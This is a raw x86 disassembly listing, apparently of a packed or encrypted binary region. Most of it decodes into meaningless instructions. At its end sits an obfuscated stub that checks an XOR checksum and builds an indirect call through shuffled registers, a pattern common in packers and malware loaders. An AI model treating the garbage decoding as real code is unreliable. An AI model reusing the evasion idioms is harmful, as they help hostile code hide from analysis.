  4158ff:	fs loop 0x4158e0
  415902:	fisubr WORD PTR [eax+0x2a]
  415905:	loope  0x415984
  415907:	mov    ss,esp
  415909:	cmp    DWORD PTR [ebx],0xa1972184
  41590f:	add    al,0x7e
  415911:	cmp    DWORD PTR [ecx],edi
  415913:	leave  
  415914:	arpl   WORD PTR [ecx+0x5d9f74a1],bx
  41591a:	mov    eax,ds:0x1c902395
  41591f:	mov    ebx,0x37da3737
  415924:	xchg   ecx,eax
  415925:	sbb    al,0xb1
  415927:	mov    al,0x64
  415929:	imul   edx,DWORD PTR [eax+ecx*8],0x13
  41592d:	in     eax,dx
  41592e:	mov    ebx,0x96c31e47
  415933:	lods   eax,DWORD PTR ds:[esi]
  415934:	(bad)
  415937:	arpl   sp,di
  415939:	sub    dl,dh
  41593b:	cmp    esi,ebp
  41593d:	xor    bl,dh
  41593f:	sub    eax,0x5b1d3a30
  415944:	mov    esp,0x559416d1
  415949:	xchg   BYTE PTR [esi],dl
  41594b:	mov    DWORD PTR [eax-0x6],ebx
  41594e:	dec    ebp
  41594f:	sub    eax,0x6eb0e7b5
  415954:	mov    esp,0x4943dfda
  415959:	imul   DWORD PTR [ecx+0x70]
  41595c:	dec    edi
  41595d:	add    eax,0xa19ee100
  415962:	int    0x3b
  415964:	es cmp al,0x98
  415967:	dec    esi
  415968:	and    eax,ecx
  41596a:	out    dx,al
  41596b:	stos   DWORD PTR es:[edi],eax
  41596c:	popf   
  41596d:	ins    DWORD PTR es:[edi],dx
  41596e:	cmc    
  41596f:	pop    ss
  415970:	cmp    BYTE PTR [ecx-0x54],ch
  415973:	ins    BYTE PTR es:[edi],dx
  415974:	in     eax,dx
  415975:	lds    esi,FWORD PTR [eax]
  415977:	pop    eax
  415978:	cld    
  415979:	test   edx,edi
  41597b:	push   es
  41597c:	cli    
  41597d:	(bad)  
  41597f:	mov    dl,0x58
  415981:	push   0x31
  415983:	push   cs
  415984:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415985:	dec    esi
  415986:	lahf   
  415987:	xchg   esp,eax
  415988:	into   
  415989:	and    al,cl
  41598b:	rol    BYTE PTR [edi-0x66],0x1d
  41598f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415990:	dec    ebx
  415991:	cdq    
  415992:	and    BYTE PTR [esi+eax*1-0x2b],bh
  415996:	adc    dl,BYTE PTR [esp+edi*1+0x68]
  41599a:	mov    edx,0xea6956bb
  41599f:	jle    0x415968
  4159a1:	test   al,0x70
  4159a3:	(bad)  
  4159a4:	dec    BYTE PTR [eiz*2+0xe3bd282]
  4159ab:	fnstsw WORD PTR [ebp-0x6527f100]
  4159b1:	fmul   QWORD PTR [ecx+ebx*1-0xccdeb9f]
  4159b8:	pop    ds
  4159b9:	lock retf 0x3f59
  4159bd:	imul   edx,DWORD PTR [ebx],0x4b380961
  4159c3:	or     eax,0x7d322fe9
  4159c8:	jle    0x415a1b
  4159ca:	gs sar ebx,1
  4159cd:	out    0x24,eax
  4159cf:	jg     0x4159e9
  4159d1:	mov    esi,0xcd6ac58
  4159d6:	cmp    DWORD PTR [ebx-0x2f],ebx
  4159d9:	mov    dh,0xc3
  4159db:	and    DWORD PTR [ecx+esi*8-0x1ef19947],0x613fa72
  4159e6:	xor    al,0x67
  4159e8:	mov    dl,0xb1
  4159ea:	stos   DWORD PTR es:[edi],eax
  4159eb:	(bad)  
  4159ec:	(bad)  
  4159ee:	xlat   BYTE PTR ds:[ebx]
  4159ef:	mov    ecx,0x8c0994bc
  4159f4:	inc    edx
  4159f5:	cmp    al,BYTE PTR ds:0x5314c67b
  4159fb:	(bad)  
  4159fc:	stos   BYTE PTR es:[edi],al
  4159fd:	add    ebx,DWORD PTR [ecx]
  4159ff:	jne    0x415a3d
  415a01:	fidiv  DWORD PTR [esi-0x3c3a766f]
  415a07:	bnd jmp 0x4159c5
  415a0a:	mov    dh,0x14
  415a0c:	mov    ds:0x39dec4c5,al
  415a11:	sbb    cl,BYTE PTR [esi]
  415a13:	mov    eax,0xb3e4fb0c
  415a18:	rcr    BYTE PTR [edx],cl
  415a1a:	inc    edi
  415a1b:	ror    BYTE PTR [ebp+0x5a],0x23
  415a1f:	mov    esp,0xe8d5b68
  415a24:	xchg   esp,eax
  415a25:	nop
  415a26:	aad    0xcb
  415a28:	out    dx,eax
  415a29:	jmp    0x4aa8915f
  415a2e:	push   ss
  415a2f:	mov    DWORD PTR [eax],ebp
  415a31:	jae    0x4159d2
  415a33:	nop
  415a34:	div    DWORD PTR [ecx]
  415a36:	jnp    0x4159ee
  415a38:	in     al,0x35
  415a3a:	lods   eax,DWORD PTR ds:[esi]
  415a3b:	jmp    0xc939:0x3fd97498
  415a42:	test   DWORD PTR [edi],eax
  415a44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a45:	dec    ebp
  415a46:	jnp    0x415a78
  415a48:	mov    ds:0x5d38ec58,al
  415a4d:	push   edi
  415a4e:	pop    es
  415a4f:	add    eax,0x2739e421
  415a54:	add    al,0x4f
  415a56:	ficom  WORD PTR [edx-0x3f]
  415a59:	sub    bh,ch
  415a5b:	push   edi
  415a5c:	sub    esi,0xffffff83
  415a5f:	scas   eax,DWORD PTR es:[edi]
  415a60:	push   0x691cdf34
  415a65:	enter  0x47c2,0x37
  415a69:	mov    ebx,0x63c07775
  415a6e:	inc    esi
  415a6f:	sub    eax,0xf263d609
  415a74:	aad    0xdb
  415a76:	shl    DWORD PTR [eax+0x33638ff],cl
  415a7c:	inc    edx
  415a7d:	inc    esp
  415a7e:	jns    0x415a77
  415a80:	sub    BYTE PTR [edi],0x1f
  415a83:	xchg   bp,ax
  415a85:	or     eax,0xe43d898c
  415a8a:	mov    edi,0x28b6ef32
  415a8f:	scas   al,BYTE PTR es:[edi]
  415a90:	fmul   QWORD PTR [ecx-0x80]
  415a93:	and    eax,0x88b56260
  415a98:	je     0x415a40
  415a9a:	loope  0x415b07
  415a9c:	ficomp DWORD PTR [edx-0x44]
  415a9f:	shl    bl,1
  415aa1:	pop    ecx
  415aa2:	mov    edi,DWORD PTR [ebp-0x41]
  415aa5:	xchg   eax,esi
  415aa7:	pop    eax
  415aa8:	xchg   ebx,eax
  415aa9:	shl    BYTE PTR [eax+0x22006278],cl
  415aaf:	test   BYTE PTR [ebx],al
  415ab1:	add    al,0x50
  415ab3:	mov    ah,0x39
  415ab5:	(bad)  
  415ab6:	into   
  415ab7:	imul   esi,ebx,0x48
  415aba:	neg    DWORD PTR [ebp+0x77]
  415abd:	lds    edx,FWORD PTR [ebx-0x52]
  415ac0:	aas    
  415ac1:	xor    al,0x50
  415ac3:	int    0x4e
  415ac5:	dec    ebx
  415ac6:	mov    edx,0x56b18df5
  415acb:	add    ah,dl
  415acd:	mov    cl,0x17
  415acf:	add    bl,bh
  415ad1:	sub    al,0xd9
  415ad3:	test   dl,bh
  415ad5:	fisub  WORD PTR [esi]
  415ad7:	dec    ebx
  415ad8:	ret    0x4f68
  415adb:	cli    
  415adc:	sbb    esp,0x4a8302da
  415ae2:	scas   al,BYTE PTR es:[edi]
  415ae3:	push   ecx
  415ae4:	mov    edx,0x236375f3
  415ae9:	pusha  
  415aea:	inc    ecx
  415aeb:	xchg   ebx,eax
  415aec:	mov    ah,ch
  415aee:	out    dx,eax
  415aef:	push   ebx
  415af0:	test   BYTE PTR [ebp-0x77aaf27f],0x69
  415af7:	sbb    al,0x6e
  415af9:	mov    esi,0x773df74d
  415afe:	cmp    al,0x2a
  415b00:	ret    
  415b01:	(bad)  
  415b03:	ja     0x415b40
  415b05:	cmp    al,0x4
  415b07:	loopne 0x415ad7
  415b09:	call   0xb576:0x202c0a26
  415b10:	mov    WORD PTR [edx-0x425457e2],gs
  415b16:	inc    ebx
  415b17:	fldcw  WORD PTR [ebp+0x37]
  415b1a:	xor    BYTE PTR [ebp+ebx*1-0x323f810a],bh
  415b21:	nop
  415b22:	sub    DWORD PTR [ebp-0x8],esi
  415b25:	adc    eax,0xc3e08eff
  415b2a:	call   0x64b4:0x382d99d1
  415b31:	push   ds
  415b32:	fdivp  st(3),st
  415b34:	pop    ebp
  415b35:	jg     0x415b30
  415b37:	adc    al,BYTE PTR [eax]
  415b39:	retf   0x6920
  415b3c:	xor    edi,eax
  415b3e:	test   DWORD PTR [edi],esp
  415b40:	mov    edx,0x99ff1338
  415b45:	mov    esi,0x73e61ef3
  415b4a:	lds    esi,FWORD PTR [ebx-0x732a8d81]
  415b50:	cs adc al,0x8d
  415b53:	inc    esi
  415b54:	jns    0x415b56
  415b56:	sahf   
  415b57:	jle    0x415b22
  415b59:	or     al,0x9e
  415b5b:	push   ds
  415b5c:	push   0xb333ada7
  415b61:	mov    al,ds:0x8500a325
  415b66:	mov    ah,bh
  415b68:	adc    edi,DWORD PTR [edi]
  415b6a:	pop    edi
  415b6b:	gs ins BYTE PTR es:[edi],dx
  415b6d:	jge    0x415b6f
  415b6f:	dec    ebp
  415b70:	jmp    0x9e69cb70
  415b75:	fbld   TBYTE PTR [ebx+0x5a]
  415b78:	xor    BYTE PTR gs:[ecx-0x5b],0xbd
  415b7d:	outs   dx,DWORD PTR ds:[esi]
  415b7e:	xchg   ecx,eax
  415b7f:	adc    esp,DWORD PTR [ecx+0x237fd142]
  415b85:	ja     0x415bf2
  415b87:	shr    DWORD PTR [ebp+ebp*4+0x24c76152],1
  415b8e:	repnz push eax
  415b90:	pusha  
  415b91:	cmp    esp,DWORD PTR [edi-0x63d480e]
  415b97:	xchg   edx,eax
  415b98:	sub    edx,DWORD PTR [esi-0x3c]
  415b9b:	hlt    
  415b9c:	or     ebx,DWORD PTR [esi]
  415b9e:	jnp    0x415c00
  415ba0:	push   ecx
  415ba1:	(bad)  
  415ba2:	lock xor ebp,DWORD PTR [ebx-0x109d4ab1]
  415ba9:	add    BYTE PTR [eax+0x7dabacb3],0xdf
  415bb0:	ret    0xd553
  415bb3:	out    0x1a,al
  415bb5:	(bad)
  415bb8:	mov    esp,0x1ae15359
  415bbd:	mov    ebx,0xf40e4bd9
  415bc2:	and    DWORD PTR [edi+0x2e36cfbc],ecx
  415bc8:	imul   esi,DWORD PTR [ebx],0xfffffff6
  415bcb:	cli    
  415bcc:	gs xchg ebx,eax
  415bce:	mov    ch,0x1e
  415bd0:	lahf   
  415bd1:	test   esp,edi
  415bd3:	xchg   edi,eax
  415bd4:	dec    esi
  415bd5:	sub    eax,0xc230a53f
  415bda:	sub    eax,0x4fa3b55f
  415bdf:	pop    ebx
  415be0:	daa    
  415be1:	(bad)  
  415be2:	push   ecx
  415be3:	test   bh,ch
  415be5:	cmp    al,0xf9
  415be7:	ret    0x6084
  415bea:	daa    
  415beb:	fs add edi,0x94e13ffa
  415bf2:	ins    DWORD PTR es:[edi],dx
  415bf3:	sahf   
  415bf4:	std    
  415bf5:	mov    ecx,0x7767441e
  415bfa:	jle    0x415bff
  415bfc:	sbb    al,BYTE PTR [esp+ebx*4-0x478d3ce5]
  415c03:	lods   eax,DWORD PTR ds:[esi]
  415c04:	neg    BYTE PTR [edx-0x6d]
  415c07:	test   al,0xbc
  415c09:	inc    eax
  415c0a:	test   BYTE PTR [ecx-0x678133e2],al
  415c10:	sub    esi,DWORD PTR [esp+edi*2]
  415c13:	aad    0x6b
  415c15:	dec    edx
  415c16:	xchg   DWORD PTR [edi+0x54],esi
  415c19:	scas   eax,DWORD PTR es:[edi]
  415c1a:	fwait
  415c1b:	jmp    0x415bac
  415c1d:	mov    ecx,DWORD PTR [ebx+ecx*8]
  415c20:	js     0x415c03
  415c22:	add    DWORD PTR [edi-0x48edbc30],esi
  415c28:	imul   ecx,DWORD PTR [edi+0x6e],0x14
  415c2c:	sbb    eax,0x56afbbde
  415c31:	popa   
  415c32:	in     al,dx
  415c33:	or     esp,eax
  415c35:	call   0xc7ae:0xd1a23fd2
  415c3c:	retf   
  415c3d:	test   BYTE PTR [eax+0x4d],0xa1
  415c41:	ja     0x415c2d
  415c43:	mov    ah,0xa6
  415c45:	xor    eax,0x3883d264
  415c4a:	push   esi
  415c4b:	lea    eax,[edx-0x280388b6]
  415c51:	or     esp,DWORD PTR ds:0x54588c
  415c57:	test   al,0xf6
  415c59:	(bad)  
  415c5a:	or     ch,BYTE PTR [edi]
  415c5c:	ret    
  415c5d:	fstp   TBYTE PTR [ebp+0x1ae5d5b1]
  415c63:	sbb    esi,DWORD PTR [edi+edx*1-0x10a1e247]
  415c6a:	sar    BYTE PTR [ecx],0x96
  415c6d:	(bad)  
  415c6e:	addr16 xor al,0xf4
  415c71:	mov    ebx,0xc6dea9c0
  415c76:	sub    al,bl
  415c78:	pop    ebp
  415c79:	add    eax,DWORD PTR [edi+0xf]
  415c7c:	(bad)  
  415c7d:	pop    ebp
  415c7e:	nop
  415c7f:	sti    
  415c80:	sub    eax,0x35f7acc4
  415c85:	std    
  415c86:	sub    al,0xb7
  415c88:	out    dx,eax
  415c89:	xor    BYTE PTR ds:0x95815eef,ch
  415c8f:	mov    al,0xc4
  415c91:	lock adc al,0xc6
  415c94:	inc    ecx
  415c95:	popa   
  415c96:	clc    
  415c97:	mov    edi,0xf82b8d41
  415c9c:	mov    ds:0x6ab6943d,al
  415ca1:	mov    ah,0xae
  415ca3:	inc    edi
  415ca4:	mov    esi,0xe46c926
  415ca9:	dec    DWORD PTR [ecx+ebx*8-0x6c96220]
  415cb0:	adc    DWORD PTR [eax-0x35c5f2c0],esi
  415cb6:	jne    0x415c3c
  415cb8:	mov    dl,0x1c
  415cba:	inc    ebp
  415cbb:	lahf   
  415cbc:	inc    ebx
  415cbd:	sbb    ah,BYTE PTR [edi-0x1b7abfc7]
  415cc3:	fidiv  DWORD PTR [esi]
  415cc5:	rcl    DWORD PTR [edx-0x6a0a1237],1
  415ccb:	aas    
  415ccc:	mov    dl,0x82
  415cce:	push   0xadf33992
  415cd3:	and    DWORD PTR [ecx+ecx*2-0x61264439],esp
  415cda:	shr    DWORD PTR [edi-0x4c29d48b],1
  415ce0:	jmp    0x415d0b
  415ce2:	inc    eax
  415ce3:	sub    eax,0xa65a811e
  415ce8:	neg    edx
  415cea:	xchg   ebx,eax
  415ceb:	repnz inc ebp
  415ced:	test   al,0xfc
  415cef:	aaa    
  415cf0:	sub    ah,BYTE PTR [ebx+0x23d5cd8c]
  415cf6:	jmp    0x2d37:0xf6ba1f1a
  415cfd:	popf   
  415cfe:	xor    cl,BYTE PTR [eax]
  415d00:	loope  0x415cfc
  415d02:	fimul  WORD PTR [ebx+0x1f62810b]
  415d08:	sbb    ebp,esi
  415d0a:	sbb    BYTE PTR [ebp+0xa],ch
  415d0d:	mov    ch,0x25
  415d0f:	push   eax
  415d10:	in     eax,0xf7
  415d12:	or     al,0x8e
  415d14:	pop    ds
  415d15:	in     al,dx
  415d16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d17:	shl    BYTE PTR [ebx-0x7ff0eb46],0x2d
  415d1e:	out    0x6d,eax
  415d20:	add    DWORD PTR ss:[edx-0x17],0x3b29231d
  415d28:	iret   
  415d29:	das    
  415d2a:	mov    cl,0x37
  415d2c:	pop    DWORD PTR [ebx+0x6fba442a]
  415d32:	sbb    DWORD PTR [ebx+0x78],edi
  415d35:	nop
  415d36:	xor    BYTE PTR [edi],al
  415d38:	jbe    0x415cf6
  415d3a:	(bad)  
  415d3b:	int3   
  415d3c:	adc    eax,esp
  415d3e:	enter  0x94c1,0x2e
  415d42:	mov    ds:0x26388434,eax
  415d47:	test   eax,0x2b15f509
  415d4c:	jecxz  0x415d0f
  415d4e:	xor    BYTE PTR [ecx-0x57],bh
  415d51:	popa   
  415d52:	imul   ebp,DWORD PTR [edi-0x44cfda0a],0xc7664de3
  415d5c:	push   eax
  415d5d:	cld    
  415d5e:	popa   
  415d5f:	jae    0x415dbc
  415d61:	inc    si
  415d63:	in     eax,dx
  415d64:	xor    eax,0x5d292503
  415d69:	and    edi,edx
  415d6b:	jge    0x415dac
  415d6d:	xor    bh,BYTE PTR [esi+0x24735586]
  415d73:	outs   dx,BYTE PTR ds:[esi]
  415d74:	ins    BYTE PTR es:[edi],dx
  415d75:	mov    ds:0x70963eb4,al
  415d7a:	lds    esp,FWORD PTR [ecx+0x48]
  415d7d:	hlt    
  415d7e:	(bad)  
  415d7f:	mov    edi,0xb8484e9a
  415d84:	xor    BYTE PTR [esi+0x6a],al
  415d87:	imul   ebp,DWORD PTR [ebp+0x35],0xffffffce
  415d8b:	add    esp,ebp
  415d8d:	hlt    
  415d8e:	xchg   eax,edi
  415d90:	(bad)  [eax]
  415d92:	push   esp
  415d93:	mov    dh,0xc
  415d95:	rcl    BYTE PTR [edi+ebx*8],1
  415d98:	push   0x54
  415d9a:	jmp    0x885eff2c
  415d9f:	sub    ecx,esp
  415da1:	cmp    al,0x69
  415da3:	xchg   ebx,eax
  415da4:	(bad)  
  415da5:	xor    esp,edi
  415da7:	gs inc edi
  415da9:	pop    ebp
  415daa:	mov    BYTE PTR fs:[eax-0x63dc6b0f],bl
  415db1:	mov    BYTE PTR [ebp-0x72],dl
  415db4:	jecxz  0x415e33
  415db6:	mov    ch,0x6d
  415db8:	cmp    al,0x56
  415dba:	adc    eax,0xfe70c5f0
  415dbf:	bswap  esi
  415dc1:	in     eax,0x17
  415dc3:	mov    esi,DWORD PTR [ebx]
  415dc5:	cmp    eax,0xcbbe520c
  415dca:	or     BYTE PTR [ecx],bl
  415dcc:	sbb    ecx,edx
  415dce:	xor    dl,BYTE PTR [ecx]
  415dd0:	and    al,0xce
  415dd2:	iret   
  415dd3:	(bad)  
  415dd4:	ss fwait
  415dd6:	mov    ch,0x1b
  415dd8:	int    0x49
  415dda:	icebp  
  415ddb:	jmp    DWORD PTR [edi+0xb]
  415dde:	ins    DWORD PTR es:[edi],dx
  415ddf:	retf   0xec96
  415de2:	adc    eax,0xecc472b0
  415de7:	sbb    eax,0x6f8101d7
  415dec:	in     eax,0x2a
  415dee:	xor    ah,BYTE PTR [eax+0x6c]
  415df1:	dec    esi
  415df2:	ret    
  415df3:	cmp    DWORD PTR [esi+0x74],esp
  415df6:	mov    es,edi
  415df8:	ficomp WORD PTR fs:[ebp+0x41340a30]
  415dff:	mov    dh,0xd8
  415e01:	(bad)  
  415e02:	jns    0x415e5e
  415e04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e05:	ror    DWORD PTR [eax],cl
  415e07:	pop    ebp
  415e08:	pop    edx
  415e09:	addr16 aam 0xe7
  415e0c:	xor    ah,ah
  415e0e:	push   ecx
  415e0f:	data16 mov dl,0x3d
  415e12:	ss pop ds
  415e14:	jle    0x415dc2
  415e16:	sbb    BYTE PTR [ecx+0x25],bh
  415e19:	add    cl,BYTE PTR [ebp-0x6e0fed0]
  415e1f:	mov    ebx,0x4ff9d5b1
  415e24:	push   ebp
  415e25:	lea    esp,[ebp-0x7a]
  415e28:	add    eax,0x22cb3444
  415e2d:	out    0x8b,eax
  415e2f:	push   ebx
  415e30:	push   0xfffffffa
  415e32:	push   0xe8e1bbdc
  415e37:	dec    ecx
  415e38:	pop    ss
  415e39:	cdq    
  415e3a:	stos   DWORD PTR es:[edi],eax
  415e3b:	or     esi,DWORD PTR [edi]
  415e3d:	cmp    eax,0x3de888bb
  415e42:	imul   esi,edx,0xffffffbf
  415e45:	rol    DWORD PTR ds:0xabdb608,cl
  415e4b:	bound  ecx,QWORD PTR ds:0x3ad854a8
  415e51:	sbb    ch,ah
  415e53:	int    0x5b
  415e55:	dec    esp
  415e56:	xor    al,0x89
  415e58:	ror    BYTE PTR [esi+0x61],1
  415e5b:	inc    eax
  415e5c:	mul    dh
  415e5e:	imul   ebx,ebp,0xebfe5f83
  415e64:	imul   ecx,DWORD PTR ds:0xa77a600d,0x8
  415e6b:	scas   al,BYTE PTR es:[edi]
  415e6c:	sbb    BYTE PTR [eax+ebp*1],0x59
  415e70:	ins    BYTE PTR es:[edi],dx
  415e71:	mov    BYTE PTR [ebp-0x366bbdab],dh
  415e77:	ins    BYTE PTR es:[edi],dx
  415e78:	inc    eax
  415e79:	or     edi,ebp
  415e7b:	push   0xffffffdb
  415e7d:	xchg   esi,eax
  415e7e:	int3   
  415e7f:	call   0xf56e:0x2a6bd1b6
  415e86:	call   0x8977:0xe3330321
  415e8d:	inc    ecx
  415e8e:	les    edi,FWORD PTR [edi]
  415e90:	jnp    0x415ec2
  415e92:	test   eax,0x1bb1efd3
  415e97:	idiv   DWORD PTR [esi]
  415e99:	add    ebp,edi
  415e9b:	mov    edx,0xf265f9e0
  415ea0:	jg     0x415e8e
  415ea2:	retf   0x5edf
  415ea5:	dec    edx
  415ea6:	sbb    BYTE PTR [ecx+0x34cbad7f],0xe8
  415ead:	scas   eax,DWORD PTR es:[edi]
  415eae:	call   0xa5d42079
  415eb3:	sub    DWORD PTR [eax],eax
  415eb5:	call   0xbc84:0xf61dec92
  415ebc:	sbb    eax,0x41ebbd4c
  415ec1:	cli    
  415ec2:	pusha  
  415ec3:	push   es
  415ec4:	cmc    
  415ec5:	cdq    
  415ec6:	test   al,0x29
  415ec8:	les    eax,FWORD PTR [ecx]
  415eca:	pusha  
  415ecb:	sbb    bl,BYTE PTR [esi]
  415ecd:	fcomip st,st(2)
  415ecf:	xor    al,BYTE PTR [edx+ebp*2]
  415ed2:	icebp  
  415ed3:	jo     0x415f13
  415ed5:	cwde   
  415ed6:	stos   BYTE PTR es:[edi],al
  415ed7:	mov    ch,0x85
  415ed9:	ret    
  415eda:	ror    eax,cl
  415edc:	fwait
  415edd:	sahf   
  415ede:	jne    0x415e71
  415ee0:	pop    ecx
  415ee1:	rol    ch,cl
  415ee3:	xchg   edi,eax
  415ee4:	dec    eax
  415ee5:	add    esp,DWORD PTR [edx+0xfcfe404]
  415eeb:	xor    DWORD PTR [ecx+0x379f0ba0],0x41
  415ef2:	mov    dh,0xb1
  415ef4:	jg     0x415f27
  415ef6:	xchg   ebx,eax
  415ef7:	fdiv   QWORD PTR ds:0xbe27d5b
  415efd:	adc    al,0x35
  415eff:	adc    ch,BYTE PTR [edi+0x15]
  415f02:	nop
  415f03:	sbb    dl,BYTE PTR [ecx-0x2f]
  415f06:	cdq    
  415f07:	das    
  415f08:	in     al,dx
  415f09:	cld    
  415f0a:	int    0xc
  415f0c:	jp     0x415f46
  415f0e:	addr16 adc cl,al
  415f11:	jmp    FWORD PTR [ecx]
  415f13:	pop    esi
  415f14:	loope  0x415ec4
  415f16:	inc    edi
  415f17:	(bad)  
  415f18:	ins    BYTE PTR es:[edi],dx
  415f19:	dec    ebp
  415f1a:	push   edx
  415f1b:	xor    al,0x33
  415f1d:	mov    DWORD PTR [eax],ebx
  415f1f:	popf   
  415f20:	jno    0x415f82
  415f22:	(bad)  
  415f23:	jae    0x415ef5
  415f25:	cmp    al,0xb4
  415f27:	test   BYTE PTR [edi],0x69
  415f2a:	xchg   esp,eax
  415f2b:	pop    esp
  415f2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f2d:	push   es
  415f2e:	repnz mov eax,ds:0x2d216350
  415f34:	push   edx
  415f35:	aaa    
  415f36:	xor    bl,BYTE PTR [eax+0x27]
  415f39:	fwait
  415f3a:	or     al,0x92
  415f3c:	sar    BYTE PTR [ebp+0x707c2a5a],cl
  415f42:	rcr    DWORD PTR [edi-0x16],cl
  415f45:	sbb    eax,0xa3e60271
  415f4a:	push   ebp
  415f4b:	xchg   esp,eax
  415f4c:	test   eax,0x8c71ccfc
  415f51:	dec    esp
  415f52:	ins    DWORD PTR es:[edi],dx
  415f53:	or     al,0x2c
  415f55:	xchg   edi,eax
  415f56:	dec    ebx
  415f57:	stos   DWORD PTR es:[edi],eax
  415f58:	(bad)  
  415f59:	cwde   
  415f5a:	pop    edi
  415f5b:	cli    
  415f5c:	mov    esi,esi
  415f5e:	rcr    DWORD PTR [ecx-0x7d],0xb3
  415f62:	xchg   ebp,eax
  415f63:	fbstp  TBYTE PTR [edi]
  415f65:	push   0x2b
  415f67:	xlat   BYTE PTR ds:[ebx]
  415f68:	jmp    0x415f27
  415f6a:	mov    al,bl
  415f6c:	mov    cs,WORD PTR ss:0x16fa8c4c
  415f73:	push   edx
  415f74:	or     ecx,DWORD PTR [esp+ecx*8]
  415f77:	xchg   edi,eax
  415f78:	lods   al,BYTE PTR ds:[esi]
  415f79:	imul   edi,DWORD PTR [edi],0xe
  415f7c:	sub    DWORD PTR ss:[edi-0x1d],esp
  415f80:	loop   0x415f63
  415f82:	call   0xd30:0x71e5ef2f
  415f89:	in     eax,0x9c
  415f8b:	gs push es
  415f8d:	pop    eax
  415f8e:	aas    
  415f8f:	dec    ebx
  415f90:	dec    edi
  415f91:	or     bh,BYTE PTR [esi+edx*2+0x2f]
  415f95:	addr16 (bad) 
  415f97:	add    eax,0xcc5f1479
  415f9c:	inc    ebx
  415f9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f9e:	xor    cl,BYTE PTR [ebp-0x1e]
  415fa1:	mov    eax,ds:0x4b6751b
  415fa6:	mov    gs,WORD PTR [ebx-0x16475046]
  415fac:	hlt    
  415fad:	(bad)  
  415fae:	ds icebp 
  415fb0:	aas    
  415fb1:	pop    esi
  415fb2:	inc    esi
  415fb3:	dec    ecx
  415fb4:	jno    0x415f3f
  415fb6:	shr    BYTE PTR [ecx+0x3a],1
  415fb9:	sub    BYTE PTR [ebx+0x6c],dh
  415fbc:	rcl    DWORD PTR [edx+ecx*1+0x58],1
  415fc0:	xor    cl,BYTE PTR [eax-0x26]
  415fc3:	out    0x8e,eax
  415fc5:	repnz call 0xdd61:0x235a7be0
  415fcd:	(bad)  
  415fce:	aam    0x70
  415fd0:	jnp    0x415f78
  415fd2:	mov    edx,DWORD PTR [esi+0x53]
  415fd5:	sub    ah,bh
  415fd7:	push   ecx
  415fd8:	test   BYTE PTR [edi],bl
  415fda:	add    DWORD PTR [ecx-0x38029345],esp
  415fe0:	(bad)  
  415fe1:	cmp    BYTE PTR [edi-0x6e],dh
  415fe4:	adc    BYTE PTR [ecx],0x37
  415fe7:	push   ebp
  415fe8:	or     eax,0x2d4cc225
  415fed:	leave  
  415fee:	push   edx
  415fef:	jbe    0x415f8f
  415ff1:	or     eax,0x6fee2dbc
  415ff6:	jle    0x416059
  415ff8:	ret    0x3813
  415ffb:	or     eax,0x73dbc2c2
  416000:	xor    al,ah
  416002:	mov    bl,0xbe
  416004:	jecxz  0x416059
  416006:	mov    DWORD PTR [esp+ebp*8-0x38],edi
  41600a:	add    DWORD PTR [ecx-0x7a],eax
  41600d:	daa    
  41600e:	mov    ecx,0x15a7ab09
  416013:	cmp    edx,edi
  416015:	and    dh,ch
  416017:	ret    0x2901
  41601a:	xchg   edx,eax
  41601b:	sbb    al,BYTE PTR [esp+esi*4+0x12]
  41601f:	ffreep st(5)
  416021:	push   edx
  416022:	xlat   BYTE PTR ds:[ebx]
  416023:	add    DWORD PTR [edi],esp
  416025:	add    ecx,eax
  416027:	ja     0x41601d
  416029:	sub    BYTE PTR [ebx+0xe619b0],al
  41602f:	fdivp  st(5),st
  416031:	fst    QWORD PTR [esi+0x77d39b55]
  416037:	bnd jne 0x41605b
  41603a:	push   0x5c93dd0d
  41603f:	jmp    0x57288cc9
  416044:	jmp    0x9e7b:0x707ad4f0
  41604b:	sbb    ah,al
  41604d:	xchg   edx,eax
  41604e:	inc    ebp
  41604f:	in     eax,dx
  416050:	fs xor eax,0x3943fac0
  416056:	and    al,0x99
  416058:	mov    BYTE PTR [ebp-0x2d1a045f],dh
  41605e:	dec    esi
  41605f:	das    
  416060:	mov    ds:0x662c6db7,eax
  416065:	rol    DWORD PTR [edx],1
  416067:	sub    esp,0xffffff8b
  41606a:	dec    ebp
  41606b:	or     BYTE PTR [ebx],dh
  41606d:	(bad)  
  41606e:	lea    eax,[eax+ecx*1+0x3272ec]
  416075:	mov    DWORD PTR [ebp+0x8],eax
  416078:	mov    eax,DWORD PTR [ebp-0xc]
  41607b:	mov    ecx,DWORD PTR [ebp+0x14]
  41607e:	xor    eax,esi
  416080:	add    eax,edi
  416082:	imul   eax,DWORD PTR [ecx]
  416085:	mov    ecx,DWORD PTR [ebp-0x4]
  416088:	mov    edx,DWORD PTR [ebp+0x8]
  41608b:	xor    ecx,esi
  41608d:	lea    ecx,[ecx+edx*1+0x3272ec]
  416094:	cmp    ecx,eax
  416096:	jne    0x413ca6
  41609c:	mov    eax,DWORD PTR [ebp-0x4]
  41609f:	xor    eax,esi
  4160a1:	add    eax,edi
  4160a3:	mov    DWORD PTR [ebp-0x10],eax
  4160a6:	mov    ebx,0x65655
  4160ab:	add    ebx,0x3234
  4160b1:	xchg   ebx,esi
  4160b3:	xor    ebx,ebx
  4160b5:	push   esi
  4160b6:	mov    esi,ebx
  4160b8:	pop    ebx
  4160b9:	mov    edx,esi
  4160bb:	add    ebx,0x1002
  4160c1:	lea    eax,[ebp-0x18]
  4160c4:	add    edx,eax
  4160c6:	add    edx,0x5
  4160c9:	push   edx
  4160ca:	inc    esi
  4160cb:	pop    ecx
  4160cc:	dec    ecx
  4160cd:	xchg   ecx,eax
  4160ce:	dec    eax
  4160cf:	xchg   ecx,eax
  4160d0:	dec    ecx
  4160d1:	xchg   ecx,edx
  4160d3:	dec    edx
  4160d4:	push   edx
  4160d5:	mov    edx,ebx
  4160d7:	pop    ebx
  4160d8:	dec    ebx
  4160d9:	call   DWORD PTR [ebx]
  4160db:	cmp    DWORD PTR [ebp+0x10],esi
  4160de:	je     0x4160fd
  4160e4:	xchg   edx,eax
  4160e5:	push   0xb
  4160e7:	pop    ecx
  4160e8:	push   0x4
  4160ea:	pop    ebx
  4160eb:	inc    ebx
  4160ec:	xchg   ebx,ecx
  4160ee:	sub    ebx,ecx
